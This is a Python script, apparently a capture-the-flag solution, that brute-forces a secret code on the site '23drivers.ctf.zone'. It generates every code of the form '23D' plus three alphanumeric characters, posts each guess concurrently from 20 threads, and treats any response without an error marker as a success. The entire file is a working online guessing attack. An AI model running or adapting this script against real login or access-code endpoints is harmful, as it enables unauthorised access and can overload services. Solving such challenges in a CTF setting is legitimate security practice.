from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product

import requests


def try_code(code):
    url = "https://23drivers.ctf.zone/"
    data = {"secret_code": code}
    try:
        res = requests.post(url, data=data)
        if '<p class="error">' not in res.text:
            print(f"SUCCESS: {code}")
            return code
        else:
            print(f"FAIL: {code}")
    except Exception as e:
        print(f"Request error for {code}: {e}")
    return None


def code_generator(chars, length=3):
    for comb in product(chars, repeat=length):
        yield "23D" + "".join(comb)


def main():
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(try_code, code): code for code in code_generator(chars)}
        for future in as_completed(futures):
            result = future.result()
            if result is not None:
                print(f"Found valid code: {result}")
                executor.shutdown(cancel_futures=True)
                break


if __name__ == "__main__":
    main()
